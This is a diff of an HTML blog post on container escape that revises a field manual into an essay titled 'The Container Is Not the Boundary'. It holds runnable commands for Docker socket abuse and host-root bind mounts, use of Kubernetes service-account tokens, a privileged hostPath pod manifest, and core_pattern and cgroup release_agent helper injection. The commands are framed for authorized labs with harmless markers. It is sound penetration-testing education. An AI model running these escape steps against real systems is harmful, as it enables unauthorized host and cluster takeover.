@@ -4,34 +4,30 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Container Escape</title>
-  <meta name="description" content="Container Escape Field Manual: primitives, gates, and failure points for container boundary analysis.">
-  <meta name="source-sha256" content="188e2492a73441e2d25bbc65615503439e6b82dbb0619d8e0d53892d8c654854">
+  <title>The Container Is Not the Boundary | Abdelaaziz Belkhair</title>
+  <meta name="description" content="A practical method for turning a container shell into a map of the runtime, node, cluster, and cloud authority around it.">
   <link rel="canonical" href="https://abdelaaziz0.github.io/blog/container-escape.html">
   <link rel="icon" href="/favicon.svg" type="image/svg+xml">
   <link rel="icon" href="/assets/img/favicon-32.png" sizes="32x32" type="image/png">
   <link rel="apple-touch-icon" href="/assets/img/apple-touch-icon.png">
   <meta property="og:type" content="article">
   <meta property="og:url" content="https://abdelaaziz0.github.io/blog/container-escape.html">
-  <meta property="og:title" content="Container Escape">
-  <meta property="og:description" content="Container Escape Field Manual: primitives, gates, and failure points for container boundary analysis.">
+  <meta property="og:title" content="The Container Is Not the Boundary">
+  <meta property="og:description" content="How to reason from an isolated shell to the host, runtime, cluster, and cloud around it.">
   <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/og-card.jpg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
-  <meta property="og:image:alt" content="Abdelaaziz Belkhair - Pentest Web et Active Directory">
+  <meta property="og:image:alt" content="Abdelaaziz Belkhair, security research and offensive tradecraft">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Container Escape">
-  <meta name="twitter:description" content="Container Escape Field Manual: primitives, gates, and failure points for container boundary analysis.">
+  <meta name="twitter:title" content="The Container Is Not the Boundary">
+  <meta name="twitter:description" content="A field method for container boundary analysis.">
   <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/og-card.jpg">
-  <meta name="twitter:image:alt" content="Abdelaaziz Belkhair - Pentest Web et Active Directory">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="stylesheet" href="../assets/css/writeup.css">
   <link rel="stylesheet" href="../assets/css/manual.css">
 </head>
 
-<body class="manual-page">
-  <div class="manual-progress" aria-hidden="true"></div>
-
+<body class="manual-page" id="top">
   <header>
     <nav>
       <a class="wordmark" href="../index.html"><span class="dot"></span> Abdelaaziz Belkhair</a>
@@ -48,1291 +44,809 @@
   </header>
 
   <main class="manual-shell">
-    <aside class="manual-rail" aria-label="Article sections">
-      <nav class="manual-toc"></nav>
-    </aside>
-
     <article class="manual-document">
       <a href="../blog.html" class="back-link manual-back">← Retour aux articles</a>
-      <div class="manual-content" id="manual-content">
-<h1 id="container-escape-field-manual">Container Escape Field Manual</h1>
-<h2 id="primitives-gates-and-failure-points">Primitives, gates, and failure points</h2>
-<p>HTB Nimbus is the reason I started writing this down.</p>
-<p>The first shell was inside a worker container. That container looked promising for about five minutes, then became boring: no useful effective capabilities, seccomp enabled, <code>/proc/sys</code> read-only, <code>/sys</code> read-only, no useful cgroup path, no raw device access. The route to root was not inside that container.</p>
-<p>The worker could reach the local AWS-like platform. That platform could create a privileged CodeBuild container. The new container had access to the primitive the worker lacked: host-level kernel configuration through <code>core_pattern</code>.</p>
-<p>That shape shows up everywhere:</p>
-<pre><code class="language-text">current container is boring
-the thing it can reach is not
-</code></pre>
-<p>This document is built around that idea. Not as a slogan, but as a decision tree. Runtime socket, hostPath, kubelet files, service account, user namespace, LSM, cgroups, kernel helper, build system. One of them usually decides whether the shell is contained or not.</p>
-<hr>
-<h1 id="0-first-pass-classify-the-container">0. First pass: classify the container</h1>
-<p>Start with facts, not payloads.</p>
-<pre><code class="language-bash">cat /proc/1/cgroup 2&gt;/dev/null
-cat /proc/self/mountinfo | head -n 10
-ls -la /.dockerenv 2&gt;/dev/null
-hostname
-env | grep -Ei 'kubernetes|docker|container|pod|aws|gcp|azure|ci|runner'
-</code></pre>
-<p>Useful signals:</p>
-<pre><code class="language-text">/.dockerenv                       Docker-style container hint
-kubepods in /proc/1/cgroup        Kubernetes workload
-containerd in cgroup              containerd runtime path
-KUBERNETES_SERVICE_HOST           Kubernetes API reachable from pod
-AWS_* / GOOGLE_* / AZURE_*        cloud or CI context
-CI=true / RUNNER_*                build environment
-</code></pre>
-<p>Privilege context:</p>
-<pre><code class="language-bash">id
-cat /proc/self/status | grep -E 'Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp'
-cat /proc/self/uid_map 2&gt;/dev/null
-cat /proc/self/gid_map 2&gt;/dev/null
-readlink /proc/self/ns/user 2&gt;/dev/null
-readlink /proc/1/ns/user 2&gt;/dev/null
-</code></pre>
-<p>Decode <code>CapEff</code> without external tools:</p>
-<pre><code class="language-bash">python3 - &lt;&lt;'PY'
-caps = [
-&quot;CHOWN&quot;,&quot;DAC_OVERRIDE&quot;,&quot;DAC_READ_SEARCH&quot;,&quot;FOWNER&quot;,&quot;FSETID&quot;,&quot;KILL&quot;,&quot;SETGID&quot;,&quot;SETUID&quot;,
-&quot;SETPCAP&quot;,&quot;LINUX_IMMUTABLE&quot;,&quot;NET_BIND_SERVICE&quot;,&quot;NET_BROADCAST&quot;,&quot;NET_ADMIN&quot;,&quot;NET_RAW&quot;,
-&quot;IPC_LOCK&quot;,&quot;IPC_OWNER&quot;,&quot;SYS_MODULE&quot;,&quot;SYS_RAWIO&quot;,&quot;SYS_CHROOT&quot;,&quot;SYS_PTRACE&quot;,&quot;SYS_PACCT&quot;,
-&quot;SYS_ADMIN&quot;,&quot;SYS_BOOT&quot;,&quot;SYS_NICE&quot;,&quot;SYS_RESOURCE&quot;,&quot;SYS_TIME&quot;,&quot;SYS_TTY_CONFIG&quot;,&quot;MKNOD&quot;,
-&quot;LEASE&quot;,&quot;AUDIT_WRITE&quot;,&quot;AUDIT_CONTROL&quot;,&quot;SETFCAP&quot;,&quot;MAC_OVERRIDE&quot;,&quot;MAC_ADMIN&quot;,&quot;SYSLOG&quot;,
-&quot;WAKE_ALARM&quot;,&quot;BLOCK_SUSPEND&quot;,&quot;AUDIT_READ&quot;,&quot;PERFMON&quot;,&quot;BPF&quot;,&quot;CHECKPOINT_RESTORE&quot;
-]
-v = int([l.split()[1] for l in open(&quot;/proc/self/status&quot;) if l.startswith(&quot;CapEff:&quot;)][0], 16)
-print(&quot;\n&quot;.join(&quot;CAP_&quot;+name for i, name in enumerate(caps) if v &amp; (1 &lt;&lt; i)))
-PY
-</code></pre>
-<p>Mounts, namespaces, and sockets:</p>
-<pre><code class="language-bash">mount
-cat /proc/self/mountinfo
-findmnt 2&gt;/dev/null
-find / -type s 2&gt;/dev/null | grep -Ei 'docker|containerd|crio|podman|kubelet'
-</code></pre>
-<p>High-signal paths:</p>
-<pre><code class="language-text">/var/run/docker.sock
-/run/docker.sock
-/run/containerd/containerd.sock
-/var/run/crio/crio.sock
-/run/podman/podman.sock
-/var/lib/kubelet
-/etc/kubernetes/manifests
-/host
-/rootfs
-/node
-/hostfs
-/proc/sys
-/sys/fs/cgroup
-</code></pre>
-<p>LSM and seccomp:</p>
-<pre><code class="language-bash">cat /proc/self/status | grep -E 'Seccomp|NoNewPrivs'
-cat /proc/self/attr/current 2&gt;/dev/null || true
-cat /proc/self/attr/apparmor/current 2&gt;/dev/null || true
-cat /sys/kernel/security/lsm 2&gt;/dev/null || true
-</code></pre>
-<p>Interpretation:</p>
-<pre><code class="language-text">Seccomp: 0                  no seccomp filter
-Seccomp: 2                  seccomp filter active
-unconfined                  AppArmor likely not constraining this process
-docker-default              default Docker AppArmor profile
-container_t                 common SELinux container domain
-spc_t                       often privileged container domain on SELinux systems
-</code></pre>
-<p>Runtime inventory:</p>
-<pre><code class="language-bash">uname -a
-cat /etc/os-release 2&gt;/dev/null
-runc --version 2&gt;/dev/null
-docker version 2&gt;/dev/null
-containerd --version 2&gt;/dev/null
-crictl version 2&gt;/dev/null
-ctr version 2&gt;/dev/null
-</code></pre>
-<p>Version strings are only a lead. Distro backports change the answer.</p>
-<hr>
-<h1 id="1-core_pattern">1. <code>core_pattern</code></h1>
-<p>The primitive:</p>
-<pre><code class="language-text">privileged container
-writable /proc/sys/kernel/core_pattern
-host-visible helper
-core-dumping crash
-</code></pre>
-<p>Check:</p>
-<pre><code class="language-bash">id
-cat /proc/self/status | grep -E 'CapEff|Seccomp|NoNewPrivs'
-ls -l /proc/sys/kernel/core_pattern 2&gt;/dev/null
-cat /proc/sys/kernel/core_pattern 2&gt;/dev/null
-grep -E 'upperdir=|workdir=|lowerdir=' /proc/self/mountinfo
-</code></pre>
-<p>Extract the overlay upperdir:</p>
-<pre><code class="language-bash">UPPERDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -n1)
-echo &quot;$UPPERDIR&quot;
-</code></pre>
-<p>If empty:</p>
-<pre><code class="language-bash">grep ' overlay ' /proc/self/mountinfo
-</code></pre>
-<p>Common upperdir shapes:</p>
-<pre><code class="language-text">/var/lib/docker/overlay2/&lt;id&gt;/diff
-/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/&lt;id&gt;/fs
-</code></pre>
-<p>Marker helper:</p>
-<pre><code class="language-bash">cat &gt; /tmp/cp_helper.sh &lt;&lt;'SH'
+
+      <header class="article-hero">
+        <p class="article-kicker">Research &amp; tradecraft · Containers</p>
+        <h1>The Container Is Not the Boundary</h1>
+        <p class="article-deck">A practical method for turning an isolated shell into a map of the runtime, node, cluster, and cloud authority around it.</p>
+        <div class="article-meta" aria-label="Article information">
+          <span>Abdelaaziz Belkhair</span>
+          <span>14 August 2026</span>
+          <span>18 min read</span>
+        </div>
+      </header>
+
+      <div class="manual-content">
+        <p class="article-lede">The first shell on HTB Nimbus landed in a worker container. It looked promising for five minutes, then stopped being interesting: no useful effective capabilities, seccomp enabled, read-only kernel interfaces, no host filesystem, and no runtime socket.</p>
+
+        <p>The escape did not come from forcing a kernel trick into that shell. The worker could reach an AWS-like control plane, and that control plane could start a privileged build. The second container had the host-global interface the first one lacked. That was the route.</p>
+
+        <blockquote class="thesis">
+          <p>A container escape is usually an authority problem before it is an exploit problem.</p>
+        </blockquote>
+
+        <div class="article-summary">
+          <p><strong>TL;DR.</strong> Do not begin with a payload. Inventory every interface that crosses the namespace, identify which component acts on the other side, and test the shortest path to stronger authority. Ask what the workload can make the runtime, kubelet, API server, build system, or cloud account do.</p>
+        </div>
+
+        <section id="boundary">
+          <h2>Find the real boundary</h2>
+          <p class="section-intro">The process namespace is only the innermost layer. A useful investigation follows authority outward until it reaches something that can affect the host or create a stronger execution context.</p>
+
+          <div class="boundary-map" role="img" aria-label="A process reaches infrastructure through container interfaces and authority planes">
+            <div class="boundary-node">
+              <span>01</span>
+              <strong>Process</strong>
+              <small>UID · caps · syscalls</small>
+            </div>
+            <div class="boundary-arrow" aria-hidden="true">→</div>
+            <div class="boundary-node">
+              <span>02</span>
+              <strong>Interfaces</strong>
+              <small>mounts · sockets · tokens</small>
+            </div>
+            <div class="boundary-arrow" aria-hidden="true">→</div>
+            <div class="boundary-node">
+              <span>03</span>
+              <strong>Authority</strong>
+              <small>runtime · kubelet · IAM</small>
+            </div>
+            <div class="boundary-arrow" aria-hidden="true">→</div>
+            <div class="boundary-node boundary-node-final">
+              <span>04</span>
+              <strong>Impact</strong>
+              <small>node · cluster · cloud</small>
+            </div>
+          </div>
+
+          <p>For every promising interface, answer three questions:</p>
+
+          <div class="flow-chain">
+            <div class="flow-step">
+              <div>
+                <h3>Can I reach it?</h3>
+                <p>A socket that exists but rejects your UID is not a primitive. A service account token without API connectivity is not a path.</p>
+              </div>
+            </div>
+            <div class="flow-step">
+              <div>
+                <h3>Can I influence it?</h3>
+                <p>Read access may disclose credentials. Write access may alter host state. Control-plane verbs may create an entirely new workload.</p>
+              </div>
+            </div>
+            <div class="flow-step">
+              <div>
+                <h3>Who acts on the result?</h3>
+                <p>The decisive actor may be host <code>dockerd</code>, kubelet, the kernel, a CI runner, or a cloud service, not the current process.</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="callout">
+            <span class="callout-label">Vocabulary</span>
+            <p>I use <em>escape</em> broadly here: crossing from the current workload into a more trusted layer. That can mean host execution, node filesystem access, cluster-level control, or a cloud pivot that creates a stronger compute context.</p>
+          </div>
+        </section>
+
+        <section id="triage">
+          <h2>Run a five-minute triage</h2>
+          <p class="section-intro">The first pass should reduce the search space. Collect identity, isolation, mounts, sockets, orchestration context, and policy state before touching anything.</p>
+
+          <h3>A compact baseline</h3>
+          <pre><code class="language-bash"># Identity and confinement
+id
+awk '/^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):/' /proc/self/status
+cat /proc/self/uid_map /proc/self/gid_map 2&gt;/dev/null
+cat /proc/self/attr/current 2&gt;/dev/null
+
+# Runtime and namespace clues
+cat /proc/1/cgroup 2&gt;/dev/null
+head -n 20 /proc/self/mountinfo
+for ns in mnt pid net ipc uts user cgroup; do
+  printf '%-7s self=%s init=%s\n' "$ns" \
+    "$(readlink /proc/self/ns/$ns 2&gt;/dev/null)" \
+    "$(readlink /proc/1/ns/$ns 2&gt;/dev/null)"
+done
+
+# Cross-boundary interfaces
+find /run /var/run -type s 2&gt;/dev/null | grep -Ei 'docker|containerd|crio|podman'
+ls -ld /host /rootfs /node /hostfs /mnt/host 2&gt;/dev/null
+ls -la /var/run/secrets/kubernetes.io/serviceaccount 2&gt;/dev/null
+env | grep -Ei 'KUBERNETES|DOCKER|CONTAINER|CI|RUNNER|CODEBUILD|AWS|AZURE|GOOGLE|GCP'</code></pre>
+
+          <p>If <code>capsh</code> is present, decode the effective capability mask directly:</p>
+          <pre><code class="language-bash">capsh --decode="0x$(awk '/CapEff:/ {print $2}' /proc/self/status)"</code></pre>
+
+          <h3>Rank evidence, not excitement</h3>
+          <div class="table-wrap">
+            <table class="signal-table">
+              <thead>
+                <tr>
+                  <th>Signal</th>
+                  <th>What it establishes</th>
+                  <th>Priority</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Usable rootful runtime socket</td>
+                  <td>The workload can ask a host daemon to create containers and mounts.</td>
+                  <td><span class="priority critical">P0</span></td>
+                </tr>
+                <tr>
+                  <td>Read-write host root</td>
+                  <td>The node filesystem boundary is already crossed.</td>
+                  <td><span class="priority critical">P0</span></td>
+                </tr>
+                <tr>
+                  <td>Workload creation + weak admission</td>
+                  <td>The identity may create a privileged or host-mounted pod.</td>
+                  <td><span class="priority critical">P0</span></td>
+                </tr>
+                <tr>
+                  <td>Writable host-global kernel interface</td>
+                  <td>A kernel callback may execute a host-visible helper.</td>
+                  <td><span class="priority high">P1</span></td>
+                </tr>
+                <tr>
+                  <td><code>CAP_SYS_ADMIN</code> alone</td>
+                  <td>A broad lead; impact still depends on namespaces, mounts, seccomp, and LSM policy.</td>
+                  <td><span class="priority medium">P2</span></td>
+                </tr>
+                <tr>
+                  <td><code>uid=0</code> alone</td>
+                  <td>Root in the current user namespace, not necessarily on the host.</td>
+                  <td><span class="priority low">P3</span></td>
+                </tr>
+                <tr>
+                  <td>An old version string</td>
+                  <td>A hypothesis. Vendor backports and an unreachable trigger can remove impact.</td>
+                  <td><span class="priority low">P3</span></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="signal">
+            <span class="signal-label">Stop condition</span>
+            <p>If the container has no useful capabilities, a private user namespace, enforced seccomp/LSM policy, read-only kernel filesystems, no host mount, no runtime socket, and a low-privilege service account, stop trying random host payloads. Move outward to the network and platform.</p>
+          </div>
+        </section>
+
+        <section id="runtime">
+          <h2>Test the shortest paths to the host</h2>
+          <p class="section-intro">Runtime APIs and host mounts outrank clever kernel work. They are explicit control surfaces, easy to validate, and usually explain impact cleanly.</p>
+
+          <h3 id="docker-socket">Docker: the socket is the privilege</h3>
+          <p>A usable rootful Docker socket is effectively a host-control API. The Docker documentation is direct about the consequence: a client that can instruct the daemon can mount the host root into a new container.</p>
+
+          <pre><code class="language-bash">SOCK=/var/run/docker.sock
+ls -l "$SOCK"
+curl -sS --unix-socket "$SOCK" http://localhost/_ping
+curl -sS --unix-socket "$SOCK" http://localhost/version
+curl -sS --unix-socket "$SOCK" http://localhost/containers/json</code></pre>
+
+          <p>In an authorized lab, a read-only bind is enough to prove the boundary:</p>
+          <pre><code class="language-bash">docker -H unix:///var/run/docker.sock run --rm \
+  --mount type=bind,src=/,dst=/host,readonly \
+  alpine:latest \
+  sh -c 'cat /host/etc/hostname; head -n 5 /host/etc/os-release'</code></pre>
+
+          <div class="state-grid">
+            <div class="state-card ok">
+              <span class="state-label">Pursue</span>
+              <h3>Rootful daemon accepts requests</h3>
+              <p>Confirm whether bind mounts, privileged containers, and image pulls are allowed. An authorization plugin may still narrow the API.</p>
+            </div>
+            <div class="state-card blocked">
+              <span class="state-label">Reclassify</span>
+              <h3>Rootless or remote daemon</h3>
+              <p>Control may stop at a user account, a VM, or another trust boundary. It is still valuable, but it is not automatically host root.</p>
+            </div>
+          </div>
+
+          <h3 id="containerd-cri">containerd and CRI: same idea, different clients</h3>
+          <p>Kubernetes nodes often expose containerd or CRI-O instead of Docker. First establish that the endpoint is reachable and learn which namespace owns the workloads.</p>
+
+          <pre><code class="language-bash">find /run /var/run -type s 2&gt;/dev/null | grep -Ei 'containerd|crio|cri'
+
+ctr --address /run/containerd/containerd.sock version
+ctr --address /run/containerd/containerd.sock namespaces list
+ctr --address /run/containerd/containerd.sock \
+  --namespace k8s.io containers list
+
+crictl --runtime-endpoint unix:///run/containerd/containerd.sock version
+crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps -a</code></pre>
+
+          <p><code>ctr</code> is a low-level debugging client, and its flags vary across releases. <code>crictl</code> needs both pod-sandbox and container configuration to create a workload. Treat syntax failures as tooling feedback; the real security question is whether the endpoint accepts a privileged workload or host bind.</p>
+
+          <h3 id="host-filesystem">A host filesystem mount is already a pivot</h3>
+          <pre><code class="language-bash">findmnt 2&gt;/dev/null
+for root in /host /rootfs /node /hostfs /mnt/host; do
+  [ -e "$root/etc/os-release" ] &amp;&amp; printf 'host view: %s\n' "$root"
+done
+
+# Test permissions without writing
+HOST=/host
+namei -l "$HOST/etc/shadow" 2&gt;/dev/null
+test -r "$HOST/etc/shadow" &amp;&amp; echo 'host shadow is readable'
+test -w "$HOST/tmp" &amp;&amp; echo 'host tmp is writable'</code></pre>
+
+          <p>On a Kubernetes node, the following locations deserve immediate attention:</p>
+          <pre><code class="language-text">/etc/kubernetes/manifests        static pods watched by kubelet
+/var/lib/kubelet/config.yaml     kubelet configuration
+/var/lib/kubelet/kubeconfig      node credentials and API context
+/var/lib/kubelet/pki             kubelet certificates
+/var/lib/kubelet/pods            mounted workload data and Secrets
+/var/lib/kubelet/plugins         CSI and device-plugin surfaces</code></pre>
+
+          <details>
+            <summary>Why a writable static-pod directory is critical</summary>
+            <p>Kubelet watches its configured <code>staticPodPath</code> and creates pods from manifests placed there. A process that can write that directory can ask kubelet to start a privileged pod with a host mount, even if the process has no Kubernetes API token.</p>
+            <pre><code class="language-bash">HOST=/host
+grep -R 'staticPodPath\|pod-manifest-path' \
+  "$HOST/var/lib/kubelet" "$HOST/etc" 2&gt;/dev/null | head</code></pre>
+            <p>Do not drop a manifest merely to see whether it works. On an assessment, agree on a harmless marker, a cleanup step, and the exact node before changing kubelet state.</p>
+          </details>
+        </section>
+
+        <section id="kubernetes">
+          <h2>Follow Kubernetes authority</h2>
+          <p class="section-intro">A well-confined Linux process can still hold a service account that creates privileged workloads. In Kubernetes, API authorization and admission policy matter as much as the container's local privileges.</p>
+
+          <h3>Establish the identity and its verbs</h3>
+          <pre><code class="language-bash">SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
+NS=$(cat "$SA_DIR/namespace")
+TOKEN=$(cat "$SA_DIR/token")
+CACERT="$SA_DIR/ca.crt"
+API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+
+curl -sS --cacert "$CACERT" \
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/api/v1/namespaces/$NS/pods" | head
+
+kubectl auth can-i --list -n "$NS"
+kubectl auth can-i create pods -n "$NS"
+kubectl auth can-i create daemonsets.apps -n "$NS"
+kubectl auth can-i get secrets -n "$NS"
+kubectl auth can-i create serviceaccounts/token -n "$NS"
+kubectl auth can-i get nodes/proxy</code></pre>
+
+          <h3>Pod creation is only half the chain</h3>
+          <p>The useful sequence is <strong>authorization → admission → scheduling → node access</strong>. A service account may be allowed to create pods while Pod Security Admission rejects <code>privileged: true</code> and <code>hostPath</code>.</p>
+
+          <p>Use server-side dry-run to test the complete policy path without creating the pod:</p>
+          <pre><code class="language-bash">kubectl apply --dry-run=server -f - &lt;&lt;'YAML'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: boundary-policy-check
+spec:
+  restartPolicy: Never
+  containers:
+  - name: check
+    image: busybox:1.36
+    command: ["sh", "-c", "id"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+      readOnly: true
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+YAML</code></pre>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Permission</th>
+                  <th>Why it matters</th>
+                  <th>Necessary follow-up</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>create pods</code></td>
+                  <td>Can select service accounts and request dangerous security contexts.</td>
+                  <td>Test admission, quota, image policy, and scheduling.</td>
+                </tr>
+                <tr>
+                  <td><code>create daemonsets</code></td>
+                  <td>Can project the same workload across many nodes.</td>
+                  <td>Check taints, selectors, and admission.</td>
+                </tr>
+                <tr>
+                  <td><code>get/list secrets</code></td>
+                  <td>May expose application credentials and legacy service-account tokens.</td>
+                  <td>Determine scope and whether the credentials cross namespaces.</td>
+                </tr>
+                <tr>
+                  <td><code>create serviceaccounts/token</code></td>
+                  <td>Can mint a bounded token for another service account.</td>
+                  <td>Identify which service accounts can be targeted.</td>
+                </tr>
+                <tr>
+                  <td><code>get nodes/proxy</code></td>
+                  <td>Can reach privileged kubelet API paths through the API server.</td>
+                  <td>Validate the verb/path combination and kubelet authorization.</td>
+                </tr>
+                <tr>
+                  <td><code>bind</code>, <code>escalate</code>, <code>impersonate</code></td>
+                  <td>Can attach, create, or assume authority beyond the current identity.</td>
+                  <td>Resolve the exact resources and subjects in scope.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>Shared namespaces are multipliers</h3>
+          <p><code>hostPID</code>, <code>hostNetwork</code>, and <code>hostIPC</code> are not escapes by themselves. They make another primitive more useful.</p>
+          <div class="flow-mini">
+            <div class="flow-card">
+              <strong>hostPID</strong>
+              <p>Exposes host processes and possibly <code>/proc/&lt;pid&gt;/root</code>. Pair it with ptrace capability or weak procfs restrictions.</p>
+            </div>
+            <div class="flow-card">
+              <strong>hostNetwork</strong>
+              <p>Exposes node-local services, kubelet listeners, metadata proxies, and the host routing table.</p>
+            </div>
+            <div class="flow-card">
+              <strong>hostIPC</strong>
+              <p>Exposes shared-memory and IPC objects. Its value depends on what host processes place there.</p>
+            </div>
+          </div>
+
+          <pre><code class="language-bash">ps -eo pid,ppid,user,comm,args | head -n 30
+readlink /proc/1/ns/pid /proc/self/ns/pid
+ls -la /proc/1/root 2&gt;/dev/null
+ip addr; ip route
+ss -lntup 2&gt;/dev/null | head
+ipcs -a 2&gt;/dev/null</code></pre>
+        </section>
+
+        <section id="kernel">
+          <h2>Evaluate kernel callbacks as chains</h2>
+          <p class="section-intro">Classic container escapes such as <code>core_pattern</code> and cgroup v1 <code>release_agent</code> are not magic incantations. They work only when four independent conditions line up.</p>
+
+          <div class="attack-steps">
+            <div class="attack-step">
+              <span class="attack-step-label">Interface</span>
+              <p>A host-global kernel control is visible and writable.</p>
+            </div>
+            <div class="attack-step">
+              <span class="attack-step-label">Authority</span>
+              <p>The process has the required capability in the relevant user namespace.</p>
+            </div>
+            <div class="attack-step">
+              <span class="attack-step-label">Path</span>
+              <p>The kernel can resolve an attacker-controlled helper from the host mount namespace.</p>
+            </div>
+            <div class="attack-step">
+              <span class="attack-step-label">Trigger</span>
+              <p>A reachable event causes the kernel to invoke that helper.</p>
+            </div>
+          </div>
+
+          <h3 id="core-pattern"><code>core_pattern</code>: the Nimbus primitive</h3>
+          <p>When <code>/proc/sys/kernel/core_pattern</code> begins with <code>|</code>, the kernel pipes a core dump to a userspace handler. In a privileged container, a writable host-global value plus a host-visible helper path can turn a container crash into host-context execution.</p>
+
+          <pre><code class="language-bash">cat /proc/sys/kernel/core_pattern
+test -w /proc/sys/kernel/core_pattern &amp;&amp; echo writable
+
+UPPERDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' \
+  /proc/self/mountinfo | head -n 1)
+printf 'overlay upperdir: %s\n' "$UPPERDIR"
+
+awk '/^(CapEff|NoNewPrivs|Seccomp):/' /proc/self/status
+cat /proc/self/uid_map</code></pre>
+
+          <p>The overlay <code>upperdir</code> matters because a path such as <code>/tmp/helper</code> usually exists only in the container mount namespace. The kernel's piped handler must be reachable from the host view.</p>
+
+          <div class="signal">
+            <span class="signal-label">Lab-only proof</span>
+            <p>Changing <code>core_pattern</code> is host-global and crashing a process is observable. Save the original value, use a harmless marker, restore it immediately, and coordinate the test. Do not replace an existing systemd-coredump or apport handler casually.</p>
+          </div>
+
+          <details>
+            <summary>The minimal proof sequence</summary>
+            <pre><code class="language-bash"># Preconditions: authorized ephemeral host, writable core_pattern,
+# a non-empty host-visible UPPERDIR, and a core-dumping trigger.
+test -n "$UPPERDIR" || exit 1
+ORIGINAL=$(cat /proc/sys/kernel/core_pattern)
+
+cat &gt; /tmp/core-helper.sh &lt;&lt;SH
 #!/bin/sh
-/bin/date &gt; /tmp/core_pattern_marker
-/bin/id &gt;&gt; /tmp/core_pattern_marker 2&gt;&amp;1
+/usr/bin/id &gt; "$UPPERDIR/core-pattern.proof"
+/usr/bin/date &gt;&gt; "$UPPERDIR/core-pattern.proof"
 SH
 
-chmod +x /tmp/cp_helper.sh
-cp /tmp/cp_helper.sh &quot;$UPPERDIR/cp_helper.sh&quot;
-chmod +x &quot;$UPPERDIR/cp_helper.sh&quot;
-</code></pre>
-<p>Point <code>core_pattern</code> at the host-visible path:</p>
-<pre><code class="language-bash">echo &quot;|$UPPERDIR/cp_helper.sh&quot; &gt; /proc/sys/kernel/core_pattern
-cat /proc/sys/kernel/core_pattern
-</code></pre>
-<p>Trigger a crash:</p>
-<pre><code class="language-bash">python3 - &lt;&lt;'PY'
-import ctypes
-ctypes.string_at(0)
-PY
-</code></pre>
-<p>Fallback:</p>
-<pre><code class="language-bash">sh -c 'kill -SEGV $$'
-</code></pre>
-<p>Important details:</p>
-<pre><code class="language-text">core_pattern is host-global
-the helper path is resolved from the host view
-/tmp/helper inside the container is usually not enough
-piped core handlers ignore RLIMIT_CORE
-LSM policy can still block execution
-systemd-coredump or apport may be the original handler
-rootless and userns-remapped containers change assumptions
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">core_pattern read-only
-no host-visible helper path
-no writable overlay upperdir
-sysctl write blocked by capability or LSM
-crash does not enter core handling path
-helper exists in container namespace only
-</code></pre>
-<p>Quick decision:</p>
-<pre><code class="language-text">writable core_pattern + upperdir visible + privileged container = pursue
-read-only core_pattern = stop
-no host-visible path = stop or switch primitive
-</code></pre>
-<hr>
-<h1 id="2-cgroups-v1-release_agent">2. cgroups v1 <code>release_agent</code></h1>
-<p>This is the other classic kernel-callback primitive.</p>
-<p>The chain:</p>
-<pre><code class="language-text">cgroups v1
-writable cgroup hierarchy
-notify_on_release control
-release_agent control
-host-visible helper
-empty cgroup trigger
-</code></pre>
-<p>Check version and exposure:</p>
-<pre><code class="language-bash">stat -fc %T /sys/fs/cgroup
-mount | grep cgroup
-cat /proc/self/cgroup
-find /sys/fs/cgroup -name release_agent -o -name notify_on_release 2&gt;/dev/null
-cat /proc/self/status | grep -E 'CapEff|Seccomp|NoNewPrivs'
-</code></pre>
-<p>Interpretation:</p>
-<pre><code class="language-text">cgroup2fs only              classic release_agent path is usually dead
-cgroup v1 mounted           continue
-release_agent found         inspect perms
-release_agent writable      high signal
-</code></pre>
-<p>Find cgroup root:</p>
-<pre><code class="language-bash">CGROOT=$(awk '$3 ~ /^cgroup$/ {print $2; exit}' /proc/mounts)
-echo &quot;$CGROOT&quot;
-</code></pre>
-<p>If there is no writable cgroup mount and <code>CAP_SYS_ADMIN</code> is effective:</p>
-<pre><code class="language-bash">mkdir -p /tmp/cgrp
-mount -t cgroup -o memory cgroup /tmp/cgrp
-CGROOT=/tmp/cgrp
-</code></pre>
-<p>Host-visible helper path:</p>
-<pre><code class="language-bash">UPPERDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -n1)
-echo &quot;$UPPERDIR&quot;
-</code></pre>
-<p>Helper:</p>
-<pre><code class="language-bash">cat &gt; /tmp/release_helper.sh &lt;&lt;'SH'
-#!/bin/sh
-/bin/date &gt; /tmp/release_agent_marker
-/bin/id &gt;&gt; /tmp/release_agent_marker 2&gt;&amp;1
-SH
+install -m 0755 /tmp/core-helper.sh "$UPPERDIR/core-helper.sh"
+printf '|%s\n' "$UPPERDIR/core-helper.sh" &gt; /proc/sys/kernel/core_pattern
+(sh -c 'kill -SEGV $$') || true
+printf '%s\n' "$ORIGINAL" &gt; /proc/sys/kernel/core_pattern</code></pre>
+            <p>Verify the marker from the host or through an approved host mount, then remove both helper and marker.</p>
+          </details>
 
-chmod +x /tmp/release_helper.sh
-cp /tmp/release_helper.sh &quot;$UPPERDIR/release_helper.sh&quot;
